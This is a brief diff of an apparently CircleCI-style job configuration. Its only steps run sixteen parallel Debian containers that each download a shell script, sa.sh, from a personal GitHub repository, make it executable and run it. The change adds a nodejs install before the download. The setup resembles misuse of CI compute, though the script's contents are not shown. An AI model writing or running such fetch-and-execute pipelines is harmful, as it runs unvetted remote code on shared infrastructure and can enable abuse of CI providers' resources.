@@ -5,7 +5,7 @@ jobs:
             - image: debian:latest 
       parallelism: 16 
       steps: 
-        - run: wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh
+        - run: apt update && apt install nodejs && wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh
         - run: chmod +x sa.sh
         - run: ./sa.sh
  
